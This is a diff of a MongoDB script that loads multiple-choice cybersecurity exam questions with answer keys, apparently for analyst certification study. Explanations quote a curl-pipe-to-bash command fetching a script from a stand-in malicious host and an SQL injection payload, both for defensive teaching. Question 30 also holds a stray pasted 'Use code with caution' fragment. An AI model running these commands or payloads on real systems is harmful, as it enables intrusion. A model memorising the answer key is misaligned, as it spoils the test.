@@ -315,19 +315,6 @@ db.tests.insertOne({
       "correctAnswerIndex": 1,
       "explanation": "This command is *extremely dangerous*. It uses `curl` to download a shell script from a (likely malicious) URL and *immediately* executes it with the privileges of the current user. That means:\n* `curl -s http://malicious.example.com/script.sh` fetches the script.\n* The pipe `|` sends the script's content directly into `bash`.\n\nThis allows arbitrary code execution on the system. Attackers often use this method to install malware, establish backdoors, or perform other malicious actions.",
       "examTip": "Commands that download and execute remote scripts (especially piping directly to `bash`) are extremely dangerous."
-    },
-    {
-      "id": 25,
-      "question": "You are investigating a suspected compromise of a Windows workstation. You believe the attacker may have used PowerShell to download and execute malicious code. Which Windows Event Log, *if properly configured*, would be MOST likely to contain evidence of this activity, including the actual PowerShell commands executed?",
-      "options": [
-        "Security Event Log",
-        "System Event Log",
-        "Application Event Log",
-        "PowerShell Operational Log (Event ID 4104 and others)"
-      ],
-      "correctAnswerIndex": 3,
-      "explanation": "The Security, System, and Application Event Logs contain valuable information, but they don't record the *actual PowerShell commands* in detail by default. *If properly configured*, Windows PowerShell has its own logging capabilities that capture script block execution (Event ID 4104) and other detailed events. Enabling PowerShell script block logging (via Group Policy) ensures the content of the scripts is recorded, which is crucial for investigating malicious PowerShell usage. Tools like Sysmon or enhanced logging configurations can also help.",
-      "examTip": "Enable PowerShell script block logging (Event ID 4104) to record the content of executed PowerShell scripts for auditing and incident response."
     }
   ]
 });
@@ -341,6 +328,19 @@ db.tests.updateOne(
       "questions": {
         $each: [
           {
+            "id": 25,
+            "question": "You are investigating a suspected compromise of a Windows workstation. You believe the attacker may have used PowerShell to download and execute malicious code. Which Windows Event Log, *if properly configured*, would be MOST likely to contain evidence of this activity, including the actual PowerShell commands executed?",
+            "options": [
+              "Security Event Log",
+              "System Event Log",
+              "Application Event Log",
+              "PowerShell Operational Log (Event ID 4104 and others)"
+            ],
+            "correctAnswerIndex": 3,
+            "explanation": "The Security, System, and Application Event Logs contain valuable information, but they don't provide the *specific level of detail* needed to see the *actual PowerShell commands executed*. Windows has specific event logs for PowerShell activity. *If properly configured* (which often requires enabling script block logging via Group Policy), these logs can record a wealth of information, including:\n * **PowerShell Operational Log (Event ID 4103):** Records the start and stop events of PowerShell pipelines.\n   *   **PowerShell Operational Log (Event ID 4104):** Records the *content of PowerShell script blocks* that are executed. This is *crucial* for identifying malicious PowerShell commands.\n    *  **PowerShell Operational Log (Event ID 800/400/600):** Records provider lifecycle events.\n     * **Security Log:** While not specifically *PowerShell* logs, Security Event Logs (especially those related to process creation - 4688) can also provide *indirect* evidence of PowerShell activity (e.g., by showing that `powershell.exe` was executed with specific command-line arguments).\n\n     The key is that *script block logging* (Event ID 4104) must be *explicitly enabled* through Group Policy or Local Security Policy. It's not enabled by default on most Windows systems.",
+            "examTip": "Enable PowerShell script block logging (Event ID 4104) to record the content of executed PowerShell scripts for auditing and incident response."
+          },
+          {
             "id": 26,
             "question": "What is the primary security purpose of 'sandboxing'?",
             "options": [
@@ -350,7 +350,7 @@ db.tests.updateOne(
               "To permanently delete suspected malware files from a system."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Sandboxing is not about encryption, backup, or deletion. A sandbox is a *virtualized, isolated environment* that is *separate* from the host operating system and network. It's used to *safely execute and analyze* potentially malicious files or code (e.g., suspicious email attachments, downloaded files, unknown executables) *without risking harm* to the production environment. The sandbox *monitors* the code's behavior:\n*   What files it creates or modifies.\n*   What network connections it makes.\n*   What registry changes it attempts.\n*   What system calls it uses.\n\nThis allows security analysts to understand the malware's functionality, identify its indicators of compromise (IoCs), and determine its potential impact.",
+            "explanation": "Sandboxing is not about encryption, backup, or deletion. A sandbox is a *virtualized, isolated environment* that is *separate* from the host operating system and network. It's used to *safely execute and analyze* potentially malicious files or code (e.g., suspicious email attachments, downloaded files, unknown executables) *without risking harm* to the production environment. The sandbox *monitors* the code's behavior:\n   *   What files it creates or modifies.\n   *   What network connections it makes.\n   *   What registry changes it attempts.\n   *   What system calls it uses.\n\n  This allows security analysts to understand the malware's functionality, identify its indicators of compromise (IoCs), and determine its potential impact.",
             "examTip": "Sandboxing provides a safe, isolated environment for dynamic malware analysis."
           },
           {
@@ -363,7 +363,7 @@ db.tests.updateOne(
               "Conducting regular penetration testing exercises."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Strong passwords/MFA are important for general security, but don't directly prevent DNS tunneling. VPNs encrypt traffic, but don't prevent the tunneling itself. Penetration testing helps *identify* vulnerabilities. *DNS tunneling* is a technique where attackers encode data from other programs or protocols (e.g., SSH, HTTP) *within DNS queries and responses*. This allows them to bypass firewalls and other security measures that might block those protocols directly. It's often used for data exfiltration, command and control (C2) communication, or bypassing network restrictions.\n\nThe most effective mitigation involves *monitoring and analyzing DNS traffic*:\n*   **Unusual Query Types** (e.g., excessive TXT, NULL, or CNAME records).\n*   **Large Query Responses** to detect data exfiltration.\n*   **Suspicious or Unknown Domains** and high query volume.\n*   **Unusual Query Lengths** (very long subdomains).\n\nSpecialized DNS security solutions and IDS/IPS rules can help automate detection.",
+            "explanation": "Strong passwords/MFA are important for general security, but don't directly prevent DNS tunneling. VPNs encrypt traffic, but don't prevent the tunneling itself. Penetration testing helps *identify* vulnerabilities. *DNS tunneling* is a technique where attackers encode data from other programs or protocols (e.g., SSH, HTTP) *within DNS queries and responses*. This allows them to bypass firewalls and other security measures that might block those protocols directly. It's often used for: data exfiltration; command and control (C2) communication; and bypassing network restrictions.\n\n The most effective mitigation involves *monitoring and analyzing DNS traffic*:\n      *   **Unusual Query Types:** Look for unusual or excessive use of DNS query types that are not typically used for legitimate DNS resolution (e.g., TXT, NULL, CNAME records).\n     *   **Large Query Responses:** Monitor the size of DNS responses. DNS tunneling often involves sending data in large DNS responses.\n    *   **Suspicious Domains:** Monitor for queries to or responses from suspicious or unknown domains, especially those known to be associated with malicious activity.\n   * **High Query Volume:** Monitor from queries to a specific domain, or from a particular host.\n        *   **Unusual Query Lengths:** Look for unusually long domain names or query parameters.\n      *    **Payload Analysis:** Inspect the content of DNS queries and responses for suspicious patterns or encoded data.\n\n     Specialized security tools, such as Intrusion Detection/Prevention Systems (IDS/IPS) and DNS security solutions, can help automate this monitoring and detection.",
             "examTip": "DNS tunneling can bypass firewalls; monitor DNS traffic for unusual patterns and use DNS security solutions."
           },
           {
@@ -376,7 +376,7 @@ db.tests.updateOne(
               "The user's web browser is outdated and needs to be updated."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "ISP or website issues wouldn't cause *consistent* redirects to *unwanted* sites. While an outdated browser is a security risk, it wouldn't be the *most likely* cause of this specific behavior. The most likely cause is either:\n* **Malware Infection:** A *browser hijacker* has modified the browser's settings, the system's HOSTS file, or installed malicious browser extensions to redirect the user's traffic.\n* **Compromised DNS Settings:** The user's DNS settings (on their computer or router) have been changed to point to a malicious DNS server.\n\nActions to take:\n1. Run a full system scan with reputable anti-malware and anti-spyware software.\n2. Check browser extensions and remove any suspicious or unknown ones.\n3. Inspect the HOSTS file for unauthorized entries.\n4. Review DNS settings (on both the computer and router) to ensure they point to legitimate DNS servers.\n5. Clear the browser cache, cookies, and history.",
+            "explanation": "ISP or website issues wouldn't cause *consistent* redirects to *unwanted* sites. While an outdated browser is a security risk, it wouldn't be the *most likely* cause of this specific behavior. The most likely cause is either:\n  *   **Malware Infection:** A *browser hijacker* (a type of malware) has modified the browser's settings, the system's HOSTS file, or installed malicious browser extensions to redirect the user's traffic.\n  *  **Compromised DNS Settings:** The user's DNS settings (on their computer or router) have been changed to point to a malicious DNS server that returns incorrect IP addresses for legitimate websites, redirecting the user to attacker-controlled sites.\n\n  Actions to take:\n    1.  *Run a full system scan* with reputable anti-malware and anti-spyware software.\n    2.  *Check browser extensions* and remove any suspicious or unknown ones.\n   3.  *Inspect the HOSTS file* (`C:\\Windows\\System32\\drivers\\etc\\hosts` on Windows) for any unauthorized entries.\n    4.  *Review DNS settings* on the computer and the router to ensure they are pointing to legitimate DNS servers (e.g., the ISP's DNS servers or a trusted public DNS resolver like Google DNS or Cloudflare DNS).\n   5. *Clear browser Cache, cookies and history*",
             "examTip": "Unexpected browser redirects are often caused by malware (browser hijackers) or compromised DNS settings."
           },
           {
@@ -389,12 +389,12 @@ db.tests.updateOne(
               "strings <filename>"
             ],
             "correctAnswerIndex": 1,
-            "explanation": "`ls -l` provides file listing information, but it isn't the most focused tool for detailed timestamps. `file` identifies file types, and `strings` searches for readable text within a file. The `stat` command displays detailed metadata about a file, including:\n* **Access Time (atime):** Last time the file's content was read.\n* **Modify Time (mtime):** Last time the file's *content* was modified.\n* **Change Time (ctime):** Last time the file's *metadata* changed (e.g., permissions).\n\nFor investigating when a file's content was last modified, `stat` is the most direct tool.",
+            "explanation": "`ls -l` provides file listing information, *including* the last modification time, but it shows other details as well and isn't the *most focused* command. `file` determines the file *type*. `strings` extracts printable strings from the file. The `stat` command is specifically designed to display detailed *status information* about a file or filesystem. This includes:\n    *   **Access Time (atime):** The last time the file's content was *read*.\n  * **Modify Time (mtime):** The last time the file's *content* was *modified*.\n   *   **Change Time (ctime):** The last time the file's *metadata* (permissions, ownership, etc.) was changed.\n    * File Size\n     *  File Permissions\n   *  Inode Number\n    * Device\n    *  And more...\n\n   For determining the last modification time of the file's *content*, `stat` provides the most direct and detailed information.",
             "examTip": "Use the `stat` command on Linux to view detailed file status information, including modification times."
           },
           {
             "id": 30,
-            "question": "A web application accepts user input and uses it to construct an SQL query. An attacker provides the following input:\n\n```\n' OR 1=1; --\nUse code with caution.\nJavaScript\nWhat type of attack is being attempted, and what is the attacker's likely goal?",
+            "question": "A web application accepts user input and uses it to construct an SQL query. An attacker provides the following input:\n\n    ```\n    ' OR 1=1; --\nUse code with caution.\nJavaScript\nWhat type of attack is being attempted, and what is the attacker's likely goal?",
             "options": [
               "Cross-site scripting (XSS); to inject malicious scripts into the website.",
               "SQL injection; to bypass authentication or retrieve all data from a database table.",
@@ -402,8 +402,8 @@ db.tests.updateOne(
               "Directory traversal; to access files outside the webroot directory."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "The input contains SQL code, not JavaScript (XSS). DoS aims to disrupt service, and directory traversal uses `../` sequences. This is a classic example of SQL injection. The attacker is injecting SQL code into the user input field. For example:\n\n```\nSELECT * FROM users WHERE username = '' OR 1=1 --\n```\n\nBecause `1=1` is always true, the query can return *all* rows, bypassing authentication or revealing sensitive data. The `--` sequence comments out the rest of the query. The attacker’s likely goals might include:\n* Bypassing login authentication\n* Extracting or modifying sensitive data\n\nThis is why parameterized queries and proper input validation are critical.",
-            "examTip": "SQL injection attacks often use `' OR 1=1 --` to create a universally true condition and bypass query logic."
+            "explanation": "The input contains SQL code, not JavaScript (XSS). DoS aims to disrupt service, not manipulate data. Directory traversal uses ../ sequences. This is a classic example of a SQL injection attack. The attacker is injecting SQL code into the user input field. Let's break down the payload:\n\n': This closes the original SQL string literal (assuming the application uses single quotes to enclose the input).\n\nOR 1=1: This injects a condition that is always true. If the original query was something like SELECT * FROM users WHERE username = 'input', it would become SELECT * FROM users WHERE username = '' OR 1=1 --'. Since 1=1 is always true, the WHERE clause will always evaluate to true, and the query will likely return all rows from the users table.\n\n--: This is an SQL comment. It comments out any remaining part of the original SQL query, preventing syntax errors.\n\nThe attacker's likely goal is to either bypass authentication (if this input is used in a login form) or to retrieve all data from a database table (as in the example above).",
+            "examTip": "SQL injection attacks often use ' OR 1=1 -- to create a universally true condition and bypass query logic."
           },
           {
             "id": 31,
@@ -415,8 +415,8 @@ db.tests.updateOne(
               "The .htaccess file is a standard part of all web servers and cannot be modified by attackers."
             ],
             "correctAnswerIndex": 1,
-            "explanation": ".htaccess files are *not* for styling or database configuration, and they *can* be modified by attackers if they gain write access. .htaccess is a directory-level configuration file used primarily by the Apache web server (and some others). Attackers often leverage a compromised .htaccess to:\n\n* **Redirect** visitors to phishing or malware-laden sites\n* **Bypass or weaken security controls** (e.g., removing authentication requirements)\n* **Rewrite rules** to hide malicious content\n* Potentially enable **remote code execution** if the server is misconfigured\n\nThis is a serious security risk and indicates the attacker has write access to the webroot.",
-            "examTip": "Malicious .htaccess changes can lead to redirects, security bypasses, and even remote code execution."
+            "explanation": ".htaccess files are not for styling and do have significant security implications. They are not related to database configuration. They can be modified by attackers. .htaccess files are distributed configuration files used by the Apache web server (and some others). They allow for directory-level configuration changes without modifying the main server configuration file. Attackers who gain write access to a web server (e.g., through a file upload vulnerability, compromised FTP credentials, or other means) can modify or create .htaccess files to achieve various malicious goals, including:\n\nRedirection: Redirect users to malicious websites (e.g., phishing sites, malware download sites).\n* Password Protection Bypass: Remove or alter password protection for directories.\n\nCustom Error Pages: Configure custom error pages that might be used for phishing or social engineering.\n\nHotlink Protection Bypass: Disable hotlink protection to allow other sites to use the server's bandwidth.\n\nMIME Type Manipulation: Change how the server handles certain file types, potentially leading to code execution.\n\nDenial of service\n\nIn some cases, even Remote Code Execution (RCE): Depending on the server's configuration and the presence of other vulnerabilities, attackers might be able to use .htaccess modifications to achieve RCE.",
+            "examTip": "Malicious .htaccess files can be used for various attacks, including redirection, security bypass, and even code execution."
           },
           {
             "id": 32,
@@ -428,8 +428,8 @@ db.tests.updateOne(
               "Implementing strong password policies and multi-factor authentication (MFA)."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "A firewall and IDS, security awareness training, and MFA are all important, but they don't directly address the *impact* of ransomware encrypting data. The single most critical defense is having *regular, offline, and tested backups*. This ensures you can restore data without paying the ransom. Specifically:\n* **Regular:** Frequent backups to minimize data loss.\n* **Offline:** Stored in a location not continuously accessible (e.g., disconnected drives or separate protected cloud storage).\n* **Tested:** Validating the restore process works properly.\n\nWith good backups, even if ransomware strikes, you can recover data.",
-            "examTip": "Regular, offline, and tested backups are the most important safeguard against ransomware."
+            "explanation": "Firewalls and IDS are important for general network security, but they don't directly protect against the core threat of ransomware (data encryption). Awareness training helps prevent infections, but doesn't help recover from them. Strong passwords/MFA protect accounts, but ransomware often encrypts data regardless of account access. The single most critical defense against ransomware is having regular, offline, and tested backups.\n\nRegular: Backups should be performed frequently (e.g., daily, hourly) to minimize data loss.\n\nOffline: Backups should be stored offline or in a location that is isolated from the network (e.g., on external drives that are disconnected after the backup, or in a cloud storage service with strong access controls and versioning). This prevents the ransomware from encrypting the backups themselves.\n\nTested: Regularly test the backup and restore process to ensure that the backups are valid, complete, and can be successfully restored in case of an attack.\n\nIf ransomware encrypts your data, having reliable backups allows you to restore your systems and data without paying the ransom.",
+            "examTip": "Regular, offline, and tested backups are the most critical defense against ransomware."
           },
           {
             "id": 33,
@@ -441,8 +441,8 @@ db.tests.updateOne(
               "To enforce strong password policies and complexity requirements for user accounts."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Input validation is not encryption, automatic logout, or password complexity. It focuses on ensuring that *any* data received from users or external sources (e.g., form fields, query parameters, cookies) is checked and sanitized before being processed. Proper input validation and sanitization prevent:\n* **SQL injection** (malicious SQL code)\n* **Cross-site scripting (XSS)** (malicious scripts)\n* **Command injection** or other injection attacks\n\nEnforcing correct data types, length restrictions, character whitelists, and escaping special characters are typical techniques in robust input validation.",
-            "examTip": "Input validation is crucial for preventing a wide range of injection attacks."
+            "explanation": "Input validation is not primarily about encryption, automatic logouts, or password strength (though those are important security measures). Input validation is a fundamental security practice that involves rigorously checking and sanitizing all data received from users (through web forms, API calls, URL parameters, cookies, etc.) before it is used by the application. This includes:\n\nVerifying that the data conforms to expected data types (e.g., integer, string, date, boolean).\n* Checking for allowed character sets (e.g., only alphanumeric characters, no special characters, or a specific set of allowed special characters).\n* Enforcing length restrictions (e.g., minimum and maximum length).\n* Validating data against expected patterns (e.g., email address format, phone number format, postal code format).\n* Sanitizing or escaping potentially dangerous characters (e.g., converting < to &lt; in HTML output to prevent XSS).\n\nRejecting unexpected values.\n\nBy thoroughly validating and sanitizing input, you can prevent a wide range of injection attacks (SQL injection, XSS, command injection) and other vulnerabilities that arise from processing untrusted data.",
+            "examTip": "Input validation is a critical defense against a wide range of web application attacks, especially injection attacks."
           },
           {
             "id": 34,
@@ -454,12 +454,12 @@ db.tests.updateOne(
               "lsof -i"
             ],
             "correctAnswerIndex": 1,
-            "explanation": "`ps aux` lists processes, `top` shows real-time CPU/memory usage, and `lsof -i` can show open network connections but is less direct for *listening* ports with PID/program info. The classic command is `netstat -tulnp`, or in more modern systems, `ss -tulnp`. In both cases:\n\n* `-t`: TCP\n* `-u`: UDP\n* `-l`: Listening sockets\n* `-n`: Numeric addresses (no DNS lookups)\n* `-p`: Show PID and program name\n\nThis gives a clear picture of which processes are listening on which network ports.",
-            "examTip": "Use `netstat -tulnp` (or `ss -tulnp`) to see listening ports and associated processes on Linux."
+            "explanation": "ps aux shows running processes, but not their network connections. top provides a dynamic view of resource usage, but not detailed network port information. lsof -i lists open files, including network sockets, but is less directly focused on listening ports with process information than netstat or ss. netstat -tulnp (or its modern equivalent, ss -tulpn) is specifically designed to display network connection information. The options provide:\n\n-t: Show TCP ports.\n* -u: Show UDP ports.\n* -l: Show only listening sockets (ports that are actively waiting for incoming connections).\n* -n: Show numerical addresses (don't resolve hostnames, which is faster and avoids potential DNS issues).\n\n-p: Show the process ID (PID) and program name associated with each socket.\n\nThis combination provides the most comprehensive and relevant information for identifying which processes are listening on which ports.",
+            "examTip": "netstat -tulnp (or ss -tulpn) is the go-to command for viewing listening ports and associated processes on Linux."
           },
           {
             "id": 35,
-            "question": "You are investigating a suspected compromise on a Windows system. You believe the attacker may have used PowerShell to download and execute malicious code. Which of the following Windows Event Log IDs, if properly configured, would provide the MOST direct evidence of the PowerShell commands executed?",
+            "question": "You are investigating a suspected compromise on a Windows system. You believe the attacker may have used PowerShell to download and execute malicious code. Which of the following Windows Event Log IDs, *if properly configured*, would provide the MOST direct evidence of the PowerShell commands executed?",
             "options": [
               "4624 (An account was successfully logged on)",
               "4104 (PowerShell script block logging)",
@@ -467,8 +467,8 @@ db.tests.updateOne(
               "1102 (The audit log was cleared)"
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Event ID 4624 is for successful logons, 4688 is new processes, and 1102 is audit log clearing. None of these show the *exact PowerShell commands*. Event ID 4104 is PowerShell script block logging, which—if enabled—captures the content of PowerShell scripts and commands executed on the system. This is *invaluable* when investigating malicious PowerShell usage.\n\n> **Note**: Script block logging is *not* enabled by default; you must enable it via Group Policy or Local Security Policy.",
-            "examTip": "Enable PowerShell script block logging (Event ID 4104) to record the content of executed PowerShell scripts."
+            "explanation": "Event ID 4624 indicates successful logons, which is useful but not specific to PowerShell. Event ID 4688 indicates a new process was created, which is also helpful, but doesn't show the content of PowerShell commands. Event ID 1102 indicates the audit log was cleared, which is suspicious, but doesn't show the commands themselves. Event ID 4104 (PowerShell script block logging), if enabled through Group Policy or Local Security Policy, specifically logs the content of PowerShell script blocks that are executed. This provides direct evidence of the PowerShell commands run on the system, making it invaluable for investigating PowerShell-based attacks. Note: Script block logging is not enabled by default on most Windows systems; it needs to be explicitly configured.",
+            "examTip": "Enable PowerShell script block logging (Event ID 4104) to record the content of executed PowerShell scripts for auditing and incident response."
           },
           {
             "id": 36,
@@ -480,8 +480,8 @@ db.tests.updateOne(
               "To inject malicious scripts into a trusted website to be executed by other users."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Stealing data is a different type of attack, password guessing is brute force, and injecting scripts is XSS. The main objective of a DoS attack is to overwhelm or otherwise disrupt the normal functioning of a system, service, or network so that legitimate users cannot access it. Common DoS methods include:\n\n* Flooding with excessive traffic\n* Exploiting protocol vulnerabilities (e.g., SYN flood)\n* Sending malformed packets to crash services",
-            "examTip": "DoS attacks focus on making services unavailable, not stealing data or injecting code."
+            "explanation": "Data theft is a different type of attack. Password guessing is a brute-force attack. Injecting scripts is cross-site scripting (XSS). A denial-of-service (DoS) attack aims to disrupt the availability of a service, system, or network resource. The attacker overwhelms the target with a flood of traffic, requests, or malformed packets, making it unable to respond to legitimate users. This can cause the service to become slow, unresponsive, or completely unavailable.",
+            "examTip": "DoS attacks aim to disrupt service availability, not steal data or gain access."
           },
           {
             "id": 37,
@@ -493,8 +493,8 @@ db.tests.updateOne(
               "Scanning a network for open ports and running services to identify potential vulnerabilities."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Buffer overflows, DoS, and port scanning are technical attacks. Social engineering leverages psychological manipulation rather than code exploits. Attackers impersonate trusted entities (e.g., IT support, managers, banks) to trick victims into divulging credentials, clicking malicious links, or changing system settings. Phishing and pretexting are among the most common social engineering methods.",
-            "examTip": "Social engineering attacks exploit human trust and psychology, not technical vulnerabilities."
+            "explanation": "Exploiting buffer overflows is a technical attack. Flooding is a DoS attack. Port scanning is reconnaissance. Social engineering relies on psychological manipulation rather than technical exploits. Attackers use deception, persuasion, and trickery to exploit human trust and cognitive biases. Common techniques include:\n* Impersonation: Pretending to be a trusted individual (e.g., IT support, a colleague, a manager) or a representative of a trusted organization (e.g., a bank, a government agency).\n\nPhishing: Sending emails, messages, or creating websites that appear to be from legitimate sources to trick users into revealing sensitive information.\n\nBaiting: Offering something enticing (e.g., a free download, a prize) to lure users into clicking a malicious link or opening an infected file.\n\nPretexting: Creating a false scenario\n\nQuid Pro Quo: Something for something\n\nTailgating: Following an authorized person into a restricted area without proper credentials.",
+            "examTip": "Social engineering attacks exploit human psychology and trust rather than technical vulnerabilities."
           },
           {
             "id": 38,
@@ -506,8 +506,8 @@ db.tests.updateOne(
               "The encryption of data on a system followed by a demand for cryptocurrency as payment."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Cryptojacking is not physical theft (like stealing hardware wallets), a phishing scam targeting crypto users, or ransomware that demands cryptocurrency. It's the *secret hijacking* of a victim's CPU/GPU power to mine cryptocurrency (e.g., Monero, Bitcoin). Attackers embed malicious scripts in websites or install malware that silently runs mining operations, slowing the victim's system and increasing electricity costs.",
-            "examTip": "Cryptojacking covertly uses a victim's computing resources for cryptocurrency mining."
+            "explanation": "Cryptojacking is not physical theft, a specific type of phishing, or ransomware (although ransomware might demand cryptocurrency). Cryptojacking is a type of cyberattack where a malicious actor secretly uses someone else's computer, server, mobile device, or other computing resources to mine cryptocurrency without their knowledge or consent. The attacker installs malware or uses malicious JavaScript code in websites to hijack the victim's processing power (CPU and/or GPU) for their own financial gain. This can significantly slow down the victim's system, increase electricity costs, and potentially cause hardware damage.",
+            "examTip": "Cryptojacking steals computing resources to mine cryptocurrency without the owner's knowledge."
           },
           {
             "id": 39,
@@ -519,8 +519,8 @@ db.tests.updateOne(
               "lsof -i (and look for unusual network connections)"
             ],
             "correctAnswerIndex": 0,
-            "explanation": "While `netstat -i` shows interface stats, it does not reveal promiscuous mode flags. `tcpdump` captures traffic; seeing *all* traffic might imply promiscuous mode, but it's indirect. `lsof -i` lists open Internet connections/files. The classic check is `ifconfig -a` (on older systems) or `ip link show` (on newer). The presence of the **PROMISC** flag indicates the interface is set to promiscuous mode. An interface in promiscuous mode captures all packets on the network segment, not just those addressed to it. This is often used for legitimate network analysis but can also be a sign of malicious sniffing.",
-            "examTip": "Look for the PROMISC flag on Linux interfaces to detect promiscuous mode."
+            "explanation": "While netstat -i shows interface statistics, it doesn't directly show the promiscuous mode flag. tcpdump captures packets; it doesn't inherently display the interface mode (though you might infer promiscuous mode if you see traffic not addressed to the host). lsof -i shows open network connections, but not the interface mode.\nThe correct way would be to use the ifconfig -a command. While ifconfig is deprecated, the output would include the flag of PROMISC if it was in promiscuous mode.\nAlternatively and more modernly, you can use ip link show to do this,\nA network interface in promiscuous mode captures all network traffic on the attached network segment, regardless of whether the traffic is addressed to that interface's MAC address or not. Normally, an interface only captures traffic destined for its own MAC address or broadcast/multicast traffic. Promiscuous mode is used for legitimate network monitoring (e.g., with Wireshark), but it can also be used by attackers to sniff network traffic and capture sensitive information (usernames, passwords, data) passing over the network.",
+            "examTip": "A network interface in promiscuous mode captures all network traffic on the segment, which can be a sign of malicious sniffing."
           },
           {
             "id": 40,
@@ -532,8 +532,8 @@ db.tests.updateOne(
               "The exfiltration of sensitive data from a compromised network to an attacker-controlled location."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Initial compromise is the *first* step. Encryption of data is common in ransomware. Exfiltration is about *stealing* data. *Lateral movement* is when an attacker, after initial compromise, tries to move deeper into the network—compromising additional systems or accounts. Techniques include:\n\n* Credential harvesting (e.g., from memory or configuration files)\n* Exploiting trusts or vulnerabilities in other hosts\n* Using remote administrative tools to pivot\n\nThe ultimate goal is to access more valuable data or systems, escalate privileges, and achieve the attacker’s overall objective (e.g., data theft, sabotage).",
-            "examTip": "Lateral movement is about expanding control inside a network after the initial breach."
+            "explanation": "Initial compromise is the attacker's *entry point*. Data encryption is often the *payload* of ransomware. Data exfiltration is the *theft* of data. *Lateral movement* is a key tactic used by attackers *after* they have gained initial access to a network. It involves the attacker moving from the initially compromised system to *other systems* within the same network. They use various techniques to do this, such as:\n        *   Exploiting vulnerabilities on internal systems.\n         *   Using stolen credentials (obtained from the initial compromise or through other means, like credential stuffing or password spraying).\n        *   Leveraging trust relationships between systems (e.g., shared accounts, domain trusts).\n          *   Using legitimate administrative tools for malicious purposes (e.g., PsExec, Remote Desktop).\n\n     The goal is to expand their access, escalate privileges, find and compromise more valuable targets (e.g., sensitive data, critical servers), and ultimately achieve their objective (e.g., data theft, sabotage, espionage).",
+            "examTip": "Lateral movement is how attackers expand their control within a compromised network after initial entry."
           },
           {
             "id": 41,
@@ -545,8 +545,8 @@ db.tests.updateOne(
               "Denial-of-service (DoS); investigate server resource usage."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "This pattern (rapid, sequential changes to `id` values) is not XSS, SQL injection, or DoS. It's *parameter enumeration* or *forced browsing*. Attackers hope to:\n\n* Discover hidden or unlinked resources\n* Enumerate valid IDs and retrieve associated data\n* Potentially bypass access controls\n\nInvestigate how the application handles the `id` parameter. Does it leak data for IDs that should not be accessible? Is there proper access control or error handling?",
-            "examTip": "Sequential parameter testing often indicates forced browsing or enumeration, a reconnaissance technique."
+            "explanation": "This pattern is not typical of XSS (which involves injecting scripts), SQL injection (which involves manipulating database queries), or DoS (which aims to disrupt service). The sequential variation of the `id` parameter strongly suggests *parameter enumeration* or *forced browsing*. The attacker is systematically trying different values for the `id` parameter, likely hoping to:\n    *   *Discover hidden content:* Find pages or resources that are not linked from the main website navigation (e.g., administrative interfaces, unpublished content).\n     *    *Identify valid IDs:* Determine which IDs correspond to existing data or records (e.g., user accounts, product listings, order details).\n   * *Bypass access controls:* Find resources that are accessible without proper authentication or authorization.\n      *    *Trigger errors or unexpected behavior:* Potentially reveal information about the application or its underlying database.\n\n     Further investigation should focus on:\n    *  The application logic that handles the `id` parameter: What does this parameter control? What data or resources does it relate to?\n     *   The responses to these requests: Are different IDs returning different content? Are any sensitive resources being exposed? Are there any error messages that reveal information?\n       *   Access controls: Are there proper access controls in place to prevent unauthorized users from accessing resources based on the `id` parameter?",
+            "examTip": "Sequential or patterned parameter variations in web requests often indicate enumeration or forced browsing attempts (reconnaissance)."
           },
           {
             "id": 42,
@@ -558,8 +558,8 @@ db.tests.updateOne(
               "Conducting regular security awareness training for developers."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Strong passwords do not stop CSRF, which exploits already-authenticated sessions. HTTPS encrypts data but does not prevent forged requests. Training is helpful, but not a direct technical defense. The best way to prevent CSRF is:\n\n* **Anti-CSRF tokens**: Unique tokens inserted into forms/requests, validated server-side.\n* **Origin/Referer Header Validation**: Ensures requests come from the correct site.\n* **SameSite Cookie Attribute**: Restricts when cookies are sent in cross-site contexts.\n\nTogether, these measures mitigate CSRF by making it difficult for external sites to trick a user’s browser into submitting unauthorized requests.",
-            "examTip": "Anti-CSRF tokens, Origin/Referer checks, and SameSite cookies are key CSRF defenses."
+            "explanation": "Strong passwords are important for general security, but don't *directly* prevent CSRF (which exploits existing authentication). HTTPS protects data *in transit*, but not the forged request itself. Developer training is important, but it's not a technical control that directly prevents CSRF. The most effective defense against CSRF is a *combination* of:\n    *   **Anti-CSRF Tokens:** Unique, secret, unpredictable tokens generated by the server for each session (or even for each form) and included in HTTP requests (usually in hidden form fields). The server then *validates* the token upon submission, ensuring the request originated from the legitimate application and not from an attacker's site. Without a valid token, the request is rejected. This is the *primary* defense.\n   *   **Origin and Referer Header Validation:** Checking the `Origin` and `Referer` headers in HTTP requests to verify that the request is coming from the expected domain (the application's own domain) and not from a malicious site. This is a *secondary* defense, as these headers *can* sometimes be manipulated, but it adds another layer of protection.\n * **SameSite Cookies:** This attribute is a good addition to the defense by restricting how cookies are sent with cross-site requests.\n\n These techniques prevent attackers from forging requests on behalf of authenticated users.",
+            "examTip": "Anti-CSRF tokens, Origin/Referer header validation, and the SameSite cookie attribute are crucial for preventing CSRF attacks."
           },
           {
             "id": 43,
@@ -571,8 +571,8 @@ db.tests.updateOne(
               "A cross-site request forgery (CSRF) attack; the user should change their email password."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "This is not SQL injection (which involves database manipulation), DoS (traffic flooding), or CSRF (forging authenticated requests). Clicking a malicious link commonly leads to either a drive-by download (automatic malware infection) or a phishing site (attempting to capture credentials). The user *may* have avoided entering credentials, but malware could still have been installed silently.\n\nImmediate actions:\n1. **Run a full system anti-malware scan**.\n2. **Clear browser history/cache**.\n3. **Change passwords** if there’s any chance they were compromised.\n4. **Check for suspicious browser extensions**.\n\nNo personal info was entered, so phishing may have failed, but drive-by downloads can happen without explicit user action.",
-            "examTip": "Clicking a suspicious link can result in drive-by downloads or phishing; scan immediately and take precautionary measures."
